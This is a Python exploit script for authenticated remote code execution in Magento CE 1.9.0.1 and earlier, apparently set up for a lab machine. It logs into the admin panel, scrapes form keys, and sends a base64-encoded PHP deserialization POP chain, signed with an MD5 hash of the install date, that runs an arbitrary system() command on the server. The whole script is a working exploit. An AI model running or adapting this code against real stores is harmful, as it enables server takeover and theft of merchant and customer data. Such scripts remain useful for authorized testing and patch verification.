#!/usr/bin/python3
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE Requests Version
# Author: 1banger
# Original Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below

import requests
from hashlib import md5
import sys
import re
import base64

### CONFIG ###
base_url = 'http://10.10.10.140/index.php/admin/'
username = 'forme'
password = 'forme'
proxy = {'http':'http://127.0.0.1:8080'}
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = b'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
command = 'whoami'
##############

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(command), command)

# LOGIN
s = requests.Session()
login_page_get = s.get(base_url, proxies=proxy)

login_page_form_key = re.search(" value=\"(.*)\"", login_page_get.text)
login_page_form_key = login_page_form_key.group(1)

login_page_post_data = {
    'form_key': login_page_form_key,
    'login[username]': username,
    'dummy': '',
    'login[password]': password
}

login_page_post = s.post(base_url, data=login_page_post_data, proxies=proxy)

# GET TUNNEL URL
admin_page_url = re.search("ajaxBlockUrl = \'(.*)\'", login_page_post.text)
admin_page_url = admin_page_url.group(1)
admin_page_key = re.search("var FORM_KEY = '(.*)'", login_page_post.text)
admin_page_key = admin_page_key.group(1)

get_url = admin_page_url + 'block/tab_orders/period/2y/?isAjax=true'
get_data = 'isAjax=false&form_key=' + admin_page_key

# print(post_data)
# print(post_url)

get_admin_page = s.get(get_url, data=get_data, proxies=proxy)

# print(get_admin_page.text)
tunnel_url = re.search('''src="(.*)?ga=''', get_admin_page.text)
tunnel_url = tunnel_url.group(1)

# print(tunnel_url)

# EXPLOIT

payload = base64.b64encode(payload.encode('UTF-8'))
gh = md5(payload + install_date).hexdigest()

exploit = tunnel_url + 'ga=' + payload.decode('utf-8') + '&h=' + gh

print(s.get(exploit).content.decode('utf-8'))